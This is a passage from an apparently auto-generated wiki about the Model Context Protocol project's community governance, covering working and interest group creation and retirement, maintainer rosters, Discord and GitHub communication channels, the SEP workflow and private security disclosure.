**Maintainer**: Official representative from the MCP steering group. Not required for every group but helps advocate for specific changes or initiatives. May sponsor SEPs and has formal authority.

Sources: [docs/community/working-interest-groups.mdx:108-115](), [docs/community/governance.mdx:24-36]()

## Lifecycle Management

### Creation Workflow

```mermaid
graph TB
    START["Contributor proposal"]
    TEMPLATE["Fill creation template<br/>in #wg-ig-group-creation<br/>Discord channel"]
    
    subgraph "Templates"
        IG_TEMPLATE["IG Template:<br/>- Facilitator(s)<br/>- Maintainer(s) (optional)<br/>- Related IGs<br/>- Differentiation<br/>- First topic"]
        WG_TEMPLATE["WG Template:<br/>- Facilitator(s)<br/>- Maintainer(s) (optional)<br/>- Use cases/interest<br/>- First Issue/PR/SEP"]
    end
    
    REVIEW["Community Moderator<br/>reviews submission"]
    VOTE["Vote in #community-moderators<br/>(private channel)<br/>72h voting period"]
    MAJORITY["Majority positive vote<br/>approves creation"]
    VETO["Core/Lead Maintainers<br/>can veto"]
    APPROVED["Group created<br/>Discord channel established"]
    
    START --> TEMPLATE
    TEMPLATE --> IG_TEMPLATE
    TEMPLATE --> WG_TEMPLATE
    IG_TEMPLATE --> REVIEW
    WG_TEMPLATE --> REVIEW
    REVIEW --> VOTE
    VOTE --> MAJORITY
    MAJORITY --> VETO
    VETO -->|"No veto"| APPROVED
    VETO -->|"Vetoed"| REJECTED["Creation rejected"]
```

Sources: [docs/community/working-interest-groups.mdx:50-58](), [docs/community/working-interest-groups.mdx:89-99]()

### Creation Templates

#### Interest Group Creation Template

| Field | Description |
|-------|-------------|
| Facilitator(s) | Person(s) responsible for organizing |
| Maintainer(s) | Optional official MCP steering group representative |
| Related IGs | Other IGs with potentially similar goals/discussions |
| Differentiation | How this IG differs from related IGs |
| First Topic | Initial discussion topic for the IG |

Sources: [docs/community/working-interest-groups.mdx:61-68]()

#### Working Group Creation Template

| Field | Description |
|-------|-------------|
| Facilitator(s) | Person(s) responsible for organizing |
| Maintainer(s) | Optional official MCP steering group representative |
| Use Cases/Interest | Explanation of need, ideally from IG discussion (not required) |
| First Issue/PR/SEP | Initial work item the WG will pursue |

Sources: [docs/community/working-interest-groups.mdx:101-107]()

### Operating Requirements

#### Interest Group Requirements

- Regular conversations in the Interest Group Discord channel
- **AND/OR** a recurring live meeting regularly attended by members
- Meeting dates/times published on [MCP community calendar](https://meet.modelcontextprotocol.io/)
- Meeting tags include topic and channel name (e.g., `auth-ig`)
- Notes publicly shared after meetings as GitHub issue or public Google Doc

Sources: [docs/community/working-interest-groups.mdx:35-41]()

#### Working Group Requirements

- Meaningful progress towards at least one SEP or spec-related implementation **OR** maintenance responsibilities for a project
- Facilitators track progress and communicate status when appropriate
- Meeting dates/times published on [MCP community calendar](https://meet.modelcontextprotocol.io/)
- Meeting tags include topic and channel name (e.g., `agents-wg`)
- Notes publicly shared after meetings as GitHub issue or public Google Doc

Sources: [docs/community/working-interest-groups.mdx:75-81]()

### Retirement Conditions

```mermaid
graph TB
    subgraph "Interest Group Retirement"
        IG_ACTIVE["IG Remains Active"]
        IG_INACTIVE["Community moderators or<br/>Core/Lead Maintainers<br/>determine no longer<br/>active/needed"]
        IG_RETIRE["IG Retired"]
        
        IG_ACTIVE -->|"As long as active"| IG_ACTIVE
        IG_ACTIVE -->|"Inactivity detected"| IG_INACTIVE
        IG_INACTIVE --> IG_RETIRE
        
        IG_NOTE["Note: Successful IGs have<br/>no time limit or expiration"]
    end
    
    subgraph "Working Group Retirement"
        WG_ACTIVE["WG Active"]
        WG_COMPLETE["All Issues/PRs<br/>completed"]
        WG_STALE["No active Issue/PR<br/>for 1+ months"]
        WG_DECISION["Community moderators or<br/>Core/Lead Maintainers<br/>decide no longer needed"]
        WG_RETIRE["WG Retired"]
        
        WG_ACTIVE --> WG_COMPLETE
        WG_ACTIVE --> WG_STALE
        WG_ACTIVE --> WG_DECISION
        WG_COMPLETE --> WG_RETIRE
        WG_STALE --> WG_RETIRE
        WG_DECISION --> WG_RETIRE
    end
```

**Interest Group Retirement**:
- Retired only when community moderators or Core/Lead Maintainers determine it's no longer active and/or needed
- No expiration date as long as active and maintained

**Working Group Retirement**:
- Community moderators or Core/Lead Maintainers decide it is no longer active/needed
- **OR** No active Issue/PR for a month or more
- **OR** Completed all Issues/PRs it intended to pursue

Sources: [docs/community/working-interest-groups.mdx:56-60](), [docs/community/working-interest-groups.mdx:97-100]()

## Current Working Groups and Interest Groups

### Active Interest Groups

The following Interest Groups are documented in [MAINTAINERS.md:121-160]():

| Interest Group | Discord Channel | Maintainers | Purpose |
|----------------|-----------------|-------------|---------|
| Security Interest Group | `#security-ig` | Den Delimarsky, Paul Carleton, Jenn Newton | Security topics in MCP |
| Authorization Interest Group | `#auth-ig` | Aaron Parecki, Darin McAdams, Paul Carleton | Authorization and OAuth 2.1 implementation |
| Client Implementor Interest Group | `#client-implementors-ig` | Alex Hancock (Goose), Ben Brandt (Zed), Connor Peet (VS Code), Gabriel Peal (Codex), Jun Han (GitHub Copilot), Tyler Leonhardt (VS Code), Michael Feldstein (Cursor) | MCP protocol representatives for clients |
| Financial Services Interest Group | `#financial-services-ig` | Sambhav Kothari, Peder Holdgaard Pedersen | MCP in financial services context |
| Transports Interest Group | `#transports-ig` | Kurtis Van Gent, Jonathan Hefner, Shaun Smith, Harvey Tuch | Transport layer topics |

**Note**: Client Implementor Interest Group members serve as MCP protocol representatives for their respective clients. For client-specific issues, use official support channels provided by each product.

Sources: [MAINTAINERS.md:125-160]()

### Active Working Groups

The following Working Groups are documented in [MAINTAINERS.md:161-175]():

| Working Group | Discord Channel | Maintainers | Deliverable Focus |
|---------------|-----------------|-------------|-------------------|
| Server Identity Working Group | `#server-identity-wg` | Nick Cooper | Server identity specifications |
| Agents Working Group | `#agents-wg` | Peter Alexander, Luca Chang, Inna Harper | Agentic workflows and agent-related SEPs |
| MCP Apps Working Group | `#mcp-apps-wg` | Liad Yosef, Ido Salomon | MCP application development |

Sources: [MAINTAINERS.md:161-175]()

### Project Maintainers (Long-term Working Groups)

These maintainers are responsible for ongoing MCP projects documented in [MAINTAINERS.md:80-112](). While not formally designated as "Working Groups," they function similarly by maintaining specific deliverables:

| Project | Repository/Scope | Maintainers | Description |
|---------|------------------|-------------|-------------|
| use-mcp | React integration | Glen Maddern | React hooks for MCP integration |
| Inspector | `@modelcontextprotocol/inspector` | Cliff Hall, Konstantin Konstantinov, Ola Hungerford | Interactive developer tool for testing MCP servers |
| Registry | MCP server discovery | Toby Padilla, Tadas Antanavicius, Adam Jones, Radoslav Dimitrov | MCP server registry and discovery platform |
| MCPB (Model Context Protocol Bundle) | Packaging system | Alexander Sklar, Adam Jones, Joan Xie | MCP server bundling and distribution |
| Reference Servers | Official examples | Ola Hungerford, Cliff Hall, Tadas Antanavicius, Shaun Smith, Jonathan Hefner | Maintained reference server implementations |

Sources: [MAINTAINERS.md:80-112]()

## Communication and Meeting Infrastructure

### Meeting Calendar

All Interest Group and Working Group meetings are published on the public MCP community calendar at [meet.modelcontextprotocol.io](https://meet.modelcontextprotocol.io/).

Facilitators are responsible for:
- Posting meeting schedules in advance
- Tagging meetings with primary topic and channel name
- Ensuring discoverability for community participation

Sources: [docs/community/working-interest-groups.mdx:25-30]()

### Communication Channels

#### Discord Channel Structure

```mermaid
graph TB
    subgraph "MCP_Contributor_Discord"
        subgraph "Interest_Group_Channels"
            SECURITY_IG["#security-ig"]
            AUTH_IG["#auth-ig"]
            CLIENT_IG["#client-implementors-ig"]
            FINANCE_IG["#financial-services-ig"]
            TRANSPORT_IG["#transports-ig"]
        end
        
        subgraph "Working_Group_Channels"
            AGENTS_WG["#agents-wg"]
            SERVER_ID_WG["#server-identity-wg"]
            MCP_APPS_WG["#mcp-apps-wg"]
        end
        
        subgraph "Management_Channels"
            CREATION["#wg-ig-group-creation"]
            MOD_PRIVATE["#community-moderators<br/>(Private)"]
        end
    end
    
    subgraph "External_Infrastructure"
        CALENDAR["meet.modelcontextprotocol.io"]
        GH_ISSUES["GitHub Issues<br/>modelcontextprotocol/modelcontextprotocol"]
        GH_DISC["GitHub Discussions"]
    end
    
    CREATION -->|"72h voting period"| MOD_PRIVATE
    
    SECURITY_IG -->|"Meeting notes"| GH_ISSUES
    AUTH_IG -->|"Meeting notes"| GH_ISSUES
    AGENTS_WG -->|"Meeting notes"| GH_ISSUES
    
    SECURITY_IG -.->|"Scheduled on"| CALENDAR
    AUTH_IG -.->|"Scheduled on"| CALENDAR
    AGENTS_WG -.->|"Scheduled on"| CALENDAR
```

**Discord Infrastructure**:
- **MCP Contributor Discord**: `discord.gg/6CSzBmMkjX` as specified in [docs/community/communication.mdx:26]()
- Each WG/IG has a dedicated public channel with standardized naming: `#{topic}-{ig|wg}`
- **Creation channel**: `#wg-ig-group-creation` for submitting proposals per [docs/community/working-interest-groups.mdx:52]()
- **Private voting**: `#community-moderators` channel for 72-hour voting period per [docs/community/working-interest-groups.mdx:53]()

**Meeting Infrastructure**:
- **Public calendar**: `meet.modelcontextprotocol.io` as specified in [docs/community/working-interest-groups.mdx:27]()
- **Meeting notes**: Posted to GitHub Issues in `modelcontextprotocol/modelcontextprotocol` repository
- Example meeting notes: [github.com/modelcontextprotocol/modelcontextprotocol/issues/1629](https://github.com/modelcontextprotocol/modelcontextprotocol/issues/1629)
- Meeting tags format: `{topic}-{ig|wg}` per [docs/community/working-interest-groups.mdx:39]()

Sources: [docs/community/working-interest-groups.mdx:25-30](), [docs/community/working-interest-groups.mdx:39-41](), [docs/community/working-interest-groups.mdx:52-58](), [docs/community/communication.mdx:19-27](), [MAINTAINERS.md:125-175]()

## Relationship to Governance Structure

### Integration with MCP Steering Group

#### Maintainer Hierarchy and WG/IG Assignments

```mermaid
graph TB
    subgraph "MAINTAINERS_md_Structure"
        subgraph "Lead_Maintainers_Section"
            LEAD["Lead Maintainers<br/>MAINTAINERS.md:7-10<br/>David Soria Parra<br/>Justin Spahr-Summers"]
        end
        
        subgraph "Core_Maintainers_Section"
            CORE["Core Maintainers<br/>MAINTAINERS.md:12-21<br/>7 members"]
        end
        
        subgraph "Maintainers_Sections"
            SDK_MAINT["SDK Maintainers<br/>MAINTAINERS.md:22-79<br/>Java, Ruby, Swift, etc."]
            PROJECT_MAINT["Project Maintainers<br/>MAINTAINERS.md:80-112<br/>Inspector, Registry, etc."]
            WGIG_MAINT["WG/IG Maintainers<br/>MAINTAINERS.md:121-175<br/>13 maintainer assignments"]
        end
    end
    
    subgraph "WG_IG_Channels"
        IG_CHANNELS["5 Interest Group Channels<br/>#security-ig, #auth-ig, etc."]
        WG_CHANNELS["3 Working Group Channels<br/>#agents-wg, etc."]
    end
    
    subgraph "SEP_Process"
        SEP_DIR["seps/ directory<br/>PR-based workflow"]
        SPONSOR["SEP Sponsor<br/>Must be from steering group"]
    end
    
    LEAD -->|"Appoints/removes<br/>governance.mdx:69"| CORE
    CORE -->|"Appoints/removes<br/>governance.mdx:47"| SDK_MAINT
    CORE -->|"Appoints/removes"| PROJECT_MAINT
    CORE -->|"Appoints/removes"| WGIG_MAINT
    
    WGIG_MAINT -.->|"Listed in"| IG_CHANNELS
    WGIG_MAINT -.->|"Listed in"| WG_CHANNELS
    
    WGIG_MAINT -->|"Can sponsor<br/>sep-guidelines.mdx:53"| SPONSOR
    CORE -->|"Can sponsor"| SPONSOR
    LEAD -->|"Can sponsor"| SPONSOR
    
    SPONSOR -->|"Manages status of"| SEP_DIR
    
    LEAD -->|"Veto power<br/>governance.mdx:67"| CORE
    CORE -->|"Veto by majority<br/>governance.mdx:61"| SDK_MAINT
```

**Maintainer Structure in MAINTAINERS.md**:

The [MAINTAINERS.md]() file documents the complete maintainer hierarchy across different sections:

| Section | Line Range | Count | Description |
|---------|------------|-------|-------------|
| Lead Maintainers | 7-10 | 2 | Ultimate authority (BDFLs) |
| Core Maintainers | 12-21 | 7 | Specification oversight |
| SDK Maintainers | 22-79 | 30+ | Language-specific SDK maintenance |
| Project Maintainers | 80-112 | 15+ | Inspector, Registry, MCPB, etc. |
| Community Moderators | 113-120 | 5 | Discord and community management |
| WG/IG Maintainers | 121-175 | 13 assignments | Working and Interest Group leadership |

**Key Points**:

1. **WG/IG Maintainers section spans lines 121-175** of MAINTAINERS.md with 13 maintainer assignments across 8 groups
2. **Not all Maintainers lead WG/IGs** - only a subset have WG/IG assignments in this section
3. **Facilitators do not automatically become Maintainers** - facilitator role is informal per [docs/community/working-interest-groups.mdx:110]()
4. **Lead and Core Maintainers can veto** WG/IG creation or modify facilitator/maintainer lists at any time per [docs/community/working-interest-groups.mdx:54]()
5. **WG/IG Maintainers can sponsor SEPs** from the `seps/` directory as part of the PR-based workflow per [docs/community/sep-guidelines.mdx:53]()

Sources: [docs/community/governance.mdx:22-30](), [docs/community/governance.mdx:47](), [docs/community/governance.mdx:61](), [docs/community/governance.mdx:67-69](), [docs/community/working-interest-groups.mdx:108-115](), [docs/community/sep-guidelines.mdx:53](), [MAINTAINERS.md:1-175]()

### Governance Principles for WG/IGs

All groups must adhere to core governance principles:

1. **Clear contribution and decision-making processes**
2. **Open communication and transparent decisions**
3. **Document their contribution process**
4. **Maintain transparent communication**
5. **Make decisions publicly** (groups must publish meeting notes and proposals)

**Default processes for groups without specified procedures**:
- GitHub pull requests and issues for contributions
- A public channel in the official MCP Contributor Discord

Sources: [docs/community/governance.mdx:79-96]()

## Relationship to SEP Process

### WG/IG Role in Specification Enhancement

#### SEP Workflow Integration

```mermaid
graph TB
    subgraph "Pre_SEP_Discussion"
        IG_DISC["Interest Group Discussions<br/>Problem identification<br/>Discord channels"]
        WG_COLLAB["Working Group Collaboration<br/>Solution development<br/>GitHub Issues"]
    end
    
    subgraph "SEP_Creation_Process"
        DRAFT["Author creates<br/>seps/0000-feature.md"]
        PR["Create pull request<br/>to seps/ directory"]
        RENUMBER["Rename to<br/>seps/{PR_NUMBER}-feature.md"]
        FIND_SPONSOR["Request sponsor<br/>from MAINTAINERS.md"]
    end
    
    subgraph "Sponsor_Assignment"
        WGIG_SPONSOR["WG/IG Maintainer<br/>MAINTAINERS.md:121-175"]
        CORE_SPONSOR["Core Maintainer<br/>MAINTAINERS.md:12-21"]
        LEAD_SPONSOR["Lead Maintainer<br/>MAINTAINERS.md:7-10"]
    end
    
    subgraph "SEP_Review"
        STATUS_DRAFT["Status: draft<br/>sep-guidelines.mdx:86"]
        STATUS_REVIEW["Status: in-review<br/>sep-guidelines.mdx:87"]
        STATUS_ACCEPTED["Status: accepted<br/>sep-guidelines.mdx:88"]
        STATUS_FINAL["Status: final<br/>sep-guidelines.mdx:91"]
    end
    
    IG_DISC -.->|"Optional but encouraged<br/>governance.mdx:89"| DRAFT
    WG_COLLAB -.->|"Optional but encouraged"| DRAFT
    
    DRAFT --> PR
    PR --> RENUMBER
    RENUMBER --> FIND_SPONSOR
    
    FIND_SPONSOR --> WGIG_SPONSOR
    FIND_SPONSOR --> CORE_SPONSOR
    FIND_SPONSOR --> LEAD_SPONSOR
    
    WGIG_SPONSOR -->|"Assigns status<br/>sep-guidelines.mdx:98"| STATUS_DRAFT
    CORE_SPONSOR --> STATUS_DRAFT
    LEAD_SPONSOR --> STATUS_DRAFT
    
    STATUS_DRAFT --> STATUS_REVIEW
    STATUS_REVIEW --> STATUS_ACCEPTED
    STATUS_ACCEPTED --> STATUS_FINAL
```

Participation in an Interest Group or Working Group is **not required** to:
- Start a Working Group
- Create a SEP in the `seps/` directory

However, building consensus within IGs and WGs provides benefits as noted in [docs/community/governance.mdx:84-90]():

**Interest Groups**:
- Help identify problems worth addressing through SEPs
- Validate that proposed SEPs align with protocol needs
- Provide community support when justifying WG formation
- Enable collaborative exploration before formal proposals

**Working Groups**:
- Facilitate collaboration on specific SEPs or themed series of SEPs
- Provide structure for producing SEP deliverables tracked via GitHub Issues
- Enable coordinated reference implementations
- May maintain projects resulting from accepted SEPs

**SEP Sponsorship Process**:
1. All SEPs must have a sponsor from the MCP steering group per [docs/community/sep-guidelines.mdx:53]()
2. Sponsor must be Maintainer, Core Maintainer, or Lead Maintainer listed in [MAINTAINERS.md]()
3. WG/IG Maintainers listed in [MAINTAINERS.md:121-175]() can sponsor SEPs emerging from their groups
4. Sponsor is responsible for updating SEP status in markdown file per [docs/community/sep-guidelines.mdx:97-104]()
5. SEPs without sponsor for 6 months are marked `dormant` per [docs/community/sep-guidelines.mdx:66]()

Sources: [docs/community/working-interest-groups.mdx:7-13](), [docs/community/working-interest-groups.mdx:69-70](), [docs/community/governance.mdx:84-90](), [docs/community/governance.mdx:116-122](), [docs/community/sep-guidelines.mdx:53](), [docs/community/sep-guidelines.mdx:66](), [docs/community/sep-guidelines.mdx:86-91](), [docs/community/sep-guidelines.mdx:97-104](), [MAINTAINERS.md:121-175]()

## Contributor On-ramp

The WG/IG structure provides a clear path for community contribution:

```mermaid
graph LR
    STEP1["1. Join Discord<br/>Follow IGs relevant to you<br/>Attend live calls"]
    STEP2["2. Offer to facilitate<br/>Contribute use cases<br/>Participate in SEPs"]
    STEP3["3. Contribute to WG<br/>deliverables<br/>Submit PRs and Issues"]
    STEP4["4. Nomination as<br/>Maintainer<br/>by active WG maintainers"]
    
    STEP1 --> STEP2
    STEP2 --> STEP3
    STEP3 --> STEP4
```

**Path to Contribution**:

1. **Join and observe**: Join the [Discord](https://discord.gg/6CSzBmMkjX), follow conversations in relevant IGs, attend live calls at [meet.modelcontextprotocol.io](https://meet.modelcontextprotocol.io/)
2. **Participate actively**: Offer to facilitate calls, contribute use cases in SEP proposals
3. **Produce work**: Contribute to WG deliverables, submit PRs and work on issues
4. **Maintainer nomination**: Active and valuable contributors will be nominated by WG maintainers as new maintainers

Sources: [docs/community/working-interest-groups.mdx:118-126]()

## Transparency and Decision Recording

All WG/IG decisions affecting the community must be documented publicly:

**Required documentation**:
- Meeting notes posted to GitHub Issues or public Google Docs
- Technical decisions recorded in GitHub Issues and SEPs
- Governance decisions captured in community documentation

**Private discussions** (e.g., in Discord) that lead to potential decisions or proposals **must be moved** to GitHub Discussions or GitHub Issues to create a persistent, searchable record.

Sources: [docs/community/communication.mdx:48-54](), [docs/community/communication.mdx:88-104]()

---

# Page: Communication Channels

# Communication Channels

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [MAINTAINERS.md](MAINTAINERS.md)
- [blog/content/posts/2025-11-25-first-mcp-anniversary.md](blog/content/posts/2025-11-25-first-mcp-anniversary.md)
- [blog/layouts/partials/footer.html](blog/layouts/partials/footer.html)
- [blog/static/posts/images/first-mcp-anniversary/david-mcp-may.webp](blog/static/posts/images/first-mcp-anniversary/david-mcp-may.webp)
- [blog/static/posts/images/first-mcp-anniversary/kent-jarvis-mcp.webp](blog/static/posts/images/first-mcp-anniversary/kent-jarvis-mcp.webp)
- [blog/static/posts/images/first-mcp-anniversary/maintainers-meetup.webp](blog/static/posts/images/first-mcp-anniversary/maintainers-meetup.webp)
- [blog/static/posts/images/first-mcp-anniversary/maintainers-write.webp](blog/static/posts/images/first-mcp-anniversary/maintainers-write.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp-night-github-mcp.webp](blog/static/posts/images/first-mcp-anniversary/mcp-night-github-mcp.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp-night.webp](blog/static/posts/images/first-mcp-anniversary/mcp-night.webp)
- [blog/static/posts/images/first-mcp-anniversary/mcp.webp](blog/static/posts/images/first-mcp-anniversary/mcp.webp)
- [docs/community/antitrust.mdx](docs/community/antitrust.mdx)
- [docs/community/communication.mdx](docs/community/communication.mdx)
- [docs/community/contributing.mdx](docs/community/contributing.mdx)
- [docs/community/governance.mdx](docs/community/governance.mdx)
- [docs/community/sep-guidelines.mdx](docs/community/sep-guidelines.mdx)
- [docs/community/working-interest-groups.mdx](docs/community/working-interest-groups.mdx)
- [docs/specification/2024-11-05/index.mdx](docs/specification/2024-11-05/index.mdx)
- [docs/specification/2025-03-26/index.mdx](docs/specification/2025-03-26/index.mdx)
- [docs/specification/2025-06-18/index.mdx](docs/specification/2025-06-18/index.mdx)
- [docs/specification/2025-11-25/index.mdx](docs/specification/2025-11-25/index.mdx)
- [docs/specification/draft/index.mdx](docs/specification/draft/index.mdx)

</details>



This document describes the communication infrastructure for the Model Context Protocol project, including where community discussions happen, how decisions are documented, and the policies governing transparency. For governance structure and decision-making processes, see [Governance Structure](#7.1). For the SEP proposal process, see [Specification Enhancement Process](#6.2).

## Overview

The MCP project maintains four primary communication channels, each serving distinct purposes in the project lifecycle:

| Channel | Purpose | Formality | Persistence |
|---------|---------|-----------|-------------|
| Discord | Real-time contributor discussions, working group coordination | Informal | Transient |
| GitHub Discussions | Long-form proposals, community consensus-building | Semi-formal | Permanent |
| GitHub Issues | Actionable tasks, bug reports, feature tracking | Formal | Permanent |
| Security Reporting | Private vulnerability disclosure | Formal | Private |

The project serves approximately 2,900+ Discord members with 100+ new contributors joining weekly as of November 2025.

**Sources:** [docs/community/communication.mdx:1-107](), [blog/content/posts/2025-11-25-first-mcp-anniversary.md:122-123]()

## Communication Channel Architecture

```mermaid
graph TB
    subgraph "Real-time Communication"
        Discord[Discord Server<br/>2,900+ members<br/>100+ new weekly]
        
        subgraph "Public Discord Channels"
            PublicSDK["SDK Development<br/>#typescript-sdk-dev<br/>#python-sdk-dev"]
            PublicWG["Working Groups<br/>Per WG/IG channels<br/>Tagged in calendar"]
            PublicTools["Tooling Development<br/>#inspector-dev<br/>#registry-dev"]
            PublicOffice["Community Onboarding<br/>Office hours<br/>Contribution guidance"]
        end
        
        subgraph "Private Discord Channels"
            PrivateSec["Security Incidents<br/>CVE handling<br/>Protocol vulnerabilities"]
            PrivatePeople["People Matters<br/>Maintainer discussions<br/>Code of conduct"]
            PrivateDecision["Decision Coordination<br/>Read-only archives<br/>Maintainer consensus"]
        end
        
        Discord --> PublicSDK
        Discord --> PublicWG
        Discord --> PublicTools
        Discord --> PublicOffice
        Discord --> PrivateSec
        Discord --> PrivatePeople
        Discord --> PrivateDecision
    end
    
    subgraph "Asynchronous Communication"
        GHDiscussions["GitHub Discussions<br/>Long-form proposals<br/>Roadmap planning"]
        GHIssues["GitHub Issues<br/>Bug reports<br/>Feature tracking"]
        SEPs["SEP Pull Requests<br/>seps/ directory<br/>Specification changes"]
    end
    
    subgraph "Decision Records"
        GHIssuesRecord["GitHub Issues<br/>Technical decisions<br/>notes label"]
        SEPsRecord["SEPs<br/>seps/ directory<br/>Specification changes"]
        ChangelogRecord["Changelog<br/>specification/draft/changelog<br/>Version history"]
        DocsRecord["Community Docs<br/>community/governance<br/>Process changes"]
    end
    
    PublicSDK -.must document in.-> GHDiscussions
    PublicWG -.must document in.-> GHIssues
    PrivateDecision -.must document in.-> GHIssuesRecord
    
    GHDiscussions --> SEPs
    GHIssues --> SEPs
    SEPs --> SEPsRecord
    SEPsRecord --> ChangelogRecord
    
    style Discord fill:#f9f9f9
    style PrivateSec fill:#ffe0e0
    style PrivatePeople fill:#ffe0e0
    style PrivateDecision fill:#ffe0e0
```

**Sources:** [docs/community/communication.mdx:8-107](), [docs/community/governance.mdx:32-34]()

## Discord Server Structure

### Access and Membership

The Discord server is designed for MCP contributors, not general MCP support. Contributors access the server at `https://discord.gg/6CSzBmMkjX` (referenced as `discord-join` link).

### Public Channel Categories

Public channels follow a default-open policy for transparency:

**SDK and Tooling Development:**
- Channels named `#<sdk-name>-sdk-dev` (e.g., `#typescript-sdk-dev`, `#python-sdk-dev`)
- Channels named `#<tool-name>-dev` (e.g., `#inspector-dev`, `#registry-dev`)
- Development occurs entirely in public from ideation through release planning

**Working and Interest Groups:**
- Each WG/IG has a dedicated channel
- Channel names tagged in the public MCP community calendar at `meet.modelcontextprotocol.io`
- Meeting notes published as GitHub Issues with links in respective channels

**Community Onboarding:**
- Office hours coordination
- Contribution guidance
- New contributor onboarding

### Private Channel Policies

Private channels exist only for specific exceptions, with strict transparency requirements:

```mermaid
graph LR
    PrivateChannel[Private Discord Channel]
    
    subgraph "Allowed Private Use Cases"
        Security["Security Incidents<br/>CVEs<br/>Protocol vulnerabilities"]
        People["People Matters<br/>Maintainer-related<br/>Code of conduct"]
        ReadOnly["Read-only Channels<br/>Maintainer decisions<br/>Limited audience coordination"]
        Urgent["Urgent Coordination<br/>Immediate response<br/>Focused audience"]
    end
    
    subgraph "Required Public Documentation"
        GHIssues["GitHub Issues<br/>notes label"]
        GHDiscussions["GitHub Discussions<br/>Context preservation"]
        Exception["Personal matters<br/>may remain private"]
    end
    
    PrivateChannel --> Security
    PrivateChannel --> People
    PrivateChannel --> ReadOnly
    PrivateChannel --> Urgent
    
    Security -.must document.-> GHIssues
    ReadOnly -.must document.-> GHIssues
    Urgent -.must document.-> GHDiscussions
    People -.may document.-> Exception
    
    style PrivateChannel fill:#ffe0e0
    style Exception fill:#fff0e0
```

All technical and governance decisions affecting the community must be documented in GitHub Discussions or Issues, labeled with `notes`. Personal matters related to individual contributors may remain private when appropriate (e.g., personal circumstances, disciplinary actions).

**Sources:** [docs/community/communication.mdx:19-53](), [docs/community/governance.mdx:32-34]()

## GitHub Discussions

### Purpose and Use Cases

GitHub Discussions serves as the structured, long-form discussion forum for project direction and feature proposals:

| Use Case | Description | Example Labels |
|----------|-------------|----------------|
| Roadmap Planning | Project direction, milestone discussions | `roadmap`, `planning` |
| Announcements | Release communications, community updates | `announcement` |
| Consensus Building | Community polls, voting on approaches | `consensus`, `poll` |
| Feature Requests | Proposals with context and rationale | `feature-request` |

Discussions accessed at `https://github.com/modelcontextprotocol/modelcontextprotocol/discussions`.

### Relationship to SEP Process

Significant Discord discussions that lead to potential decisions or proposals must be moved to GitHub Discussions to create a persistent, searchable record. Discussions then promote to SEP pull requests as they mature:

```mermaid
graph TD
    Discord["Discord Discussion<br/>Real-time exploration<br/>Working Group brainstorm"]
    GHDiscussion["GitHub Discussion<br/>Structured proposal<br/>Community feedback"]
    SEPDraft["SEP Draft PR<br/>seps/0000-feature.md<br/>Sponsor search"]
    SEPReview["SEP In-Review<br/>seps/####-feature.md<br/>Core Maintainer review"]
    SEPFinal["SEP Final<br/>Merged to seps/<br/>Reference implementation"]
    
    Discord -.must move to.-> GHDiscussion
    GHDiscussion --> SEPDraft
    SEPDraft --> SEPReview
    SEPReview --> SEPFinal
    
    GHDiscussion -.optional for.-> SEPDraft
    
    Note1["Note: Moving from Discord<br/>to Discussion preserves<br/>searchable context"]
    Note2["Note: SEPs can start<br/>without prior Discussion<br/>but IG input encouraged"]
    
    Discord -.-> Note1
    GHDiscussion -.-> Note2
```

**Sources:** [docs/community/communication.mdx:54-66](), [docs/community/sep-guidelines.mdx:41-42](), [seps/1850-pr-based-sep-workflow.md:13-31]()

## GitHub Issues

### Issue Types and Workflows

GitHub Issues handle actionable development tasks across all MCP repositories:

| Issue Type | Purpose | Labels | Assignment |
|------------|---------|--------|------------|
| Bug Report | Reproducible defects with steps | `bug` | Maintainer triages |
| Documentation | Improvements with specific scope | `docs` | Open contribution |
| CI/CD | Infrastructure, pipeline failures | `ci`, `infrastructure` | Maintainer handles |
| Release Task | Milestone tracking items | `release`, `milestone` | Maintainer coordinates |

### SEP vs Issue Distinction

SEPs are **not** submitted as GitHub Issues. The PR-based SEP workflow introduced in November 2025 (SEP-1850) requires proposals as pull requests to the `seps/` directory:

```
# Incorrect - Do not use Issues for SEPs
❌ github.com/modelcontextprotocol/specification/issues/new

# Correct - Use pull requests to seps/ directory  
✅ github.com/modelcontextprotocol/specification/tree/main/seps
   seps/0000-your-feature.md → PR → seps/1234-your-feature.md
```

Repositories without GitHub Discussions enabled should use Issues for feature requests and proposals as a fallback.

**Sources:** [docs/community/communication.mdx:67-79](), [seps/1850-pr-based-sep-workflow.md:1-46](), [blog/content/posts/2025-11-28-sep-process-update.md:7-35]()

## Security Reporting Process

### Private Disclosure Mechanism

Security issues must never be posted publicly. The project maintains a formal security reporting process:

```mermaid
graph TD
    Vulnerability["Security Vulnerability<br/>Protocol-level issue<br/>Implementation bug"]
    
    subgraph "Reporting Methods"
        PrivateReport["Private Security Advisory<br/>SECURITY.md process<br/>GitHub's reporting tool"]
        DirectContact["Direct Contact<br/>Lead Maintainers<br/>Core Maintainers"]
    end
    
    subgraph "Handling Process"
        Triage["Security Triage<br/>Private Discord channel<br/>Maintainer assessment"]
        Fix["Fix Development<br/>Private repository fork<br/>Coordinated disclosure"]
        Disclosure["Public Disclosure<br/>CVE publication<br/>Security advisory"]
    end
    
    Vulnerability --> PrivateReport
    Vulnerability --> DirectContact
    
    PrivateReport --> Triage
    DirectContact --> Triage
    
    Triage --> Fix
    Fix --> Disclosure
    
    style Vulnerability fill:#ffe0e0
    style Triage fill:#ffe0e0
    style Fix fill:#ffe0e0
```

**Process Location:** [SECURITY.md](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/SECURITY.md) in the specification repository.

**Responsible Disclosure Guidelines:**
1. Do not open public issues for security vulnerabilities
2. Use GitHub's private security advisory feature or email maintainers directly
3. Allow reasonable time for fixes before public disclosure
4. Follow CVE coordination for protocol-level vulnerabilities

**Sources:** [docs/community/communication.mdx:81-88]()

## Decision Record System

### Documentation Requirements

All MCP decisions are documented and captured in public channels, following a structured record-keeping system:

| Decision Type | Record Location | Format | Labels |
|---------------|----------------|--------|--------|
| Technical Decisions | GitHub Issues | Issue description with rationale | `decision`, `notes` |
| Specification Changes | SEP files in `seps/` | Markdown with status field | Per SEP status |
| Version Changes | `specification/draft/changelog` | Markdown changelog entries | N/A |
| Process Changes | `docs/community/` | MDX documentation pages | N/A |
| Governance Updates | GitHub Issues + SEPs | Combined issue + SEP | `governance` |

### Decision Record Structure

When documenting decisions, maintainers preserve context following this structure:

```markdown
## Decision: [Brief Title]

**Decision Makers:** [@maintainer1, @maintainer2]

**Background Context:**
